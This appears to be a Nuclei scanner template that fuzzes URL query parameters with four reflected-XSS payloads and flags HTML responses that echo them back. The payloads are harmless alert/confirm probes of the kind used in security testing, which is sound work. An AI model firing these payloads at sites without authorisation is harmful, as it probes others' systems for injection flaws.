id: Nawab_Xss

info:
  name: ⚡ Nawab-Confirmed-XSS ⚡
  author: thenawabx
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      xss_payloads:
        - "<video><source/onerror=confirm(1)>"
        - "<body/onpageshow=alert?.(1)>"
        - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
        - "<script>alert(1)</script>"

    fuzzing:
      - part: query
        type: replace
        fuzz:
          - "{{xss_payloads}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<video><source/onerror=confirm(1)>"
          - "<body/onpageshow=alert?.(1)>"
          - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
          - "<script>alert(1)</script>"
        condition: or

      - type: word
        part: header
        words:
          - "text/html"

    extractors:
      - type: word
        name: FOUND_XSS
        part: body
        words:
          - "<video><source/onerror=confirm(1)>"
          - "<body/onpageshow=alert?.(1)>"
          - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
          - "<script>alert(1)</script>"

